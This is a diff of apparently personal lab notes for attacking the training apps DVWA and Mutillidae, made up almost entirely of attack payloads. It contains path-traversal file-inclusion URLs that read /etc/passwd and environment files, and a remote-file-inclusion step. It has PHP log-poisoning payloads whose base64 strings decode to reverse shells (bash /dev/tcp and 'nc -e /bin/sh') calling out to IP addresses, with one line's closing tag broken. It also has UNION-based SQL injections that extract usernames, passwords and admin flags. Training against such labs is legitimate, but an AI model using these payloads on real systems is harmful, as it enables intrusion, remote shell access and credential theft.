@@ -20,7 +20,14 @@ Additonal tools:
 7.File injection: http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../../etc/passwd, or /etc/passwd
 		  http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../../proc/version, or /proc/version
 		  http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../log/auth.log or /proc/self/environ or /log/apache2/access.log(not working)
-		  burpsuite user agent payload: <?passthru(base64_decode('c2ggLWkgPiYgL2Rldi90Y3AvMTAuNy40MC40NS85MDAxIDA+JjE='));?>
+		  burpsuite user agent payload: <?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjI5LjEzOSA5MDAx'));?
+		  http://localhost/DVWA/vulnerabilities/fi/?page=htTp://localhost/reverse.txt(remote php file execute)(upload reverse.txt to /var/www/html)
+8.SQL injection normal(mutillidae): 'or 1=1 -- -
+		extract database tables : http://localhost/mutillidae/index.php?page=user-info.php&username=admin'union select 1,table_name,null,null,5,6,7 from information_schema.tables where table_schema='mutillidae' -- -&password=password&user-info-php-submit-button=View Account Details
+		extract a specific table columns( table accounts ): http://localhost/mutillidae/index.php?page=user-info.php&username=admin'union select 1,column_name,null,null,5,6,7 from information_schema.columns where table_name='accounts' -- -&password=password&user-info-php-submit-button=View Account Details
+		extract a information form the columns (user,pass,privilages): http://localhost/mutillidae/index.php?page=user-info.php&username=admin'union select 1,username,password,is_admin,5,6,7 from accounts -- -&password=password&user-info-php-submit-button=View Account Details
+		
+			
 		  
 		  
 		  
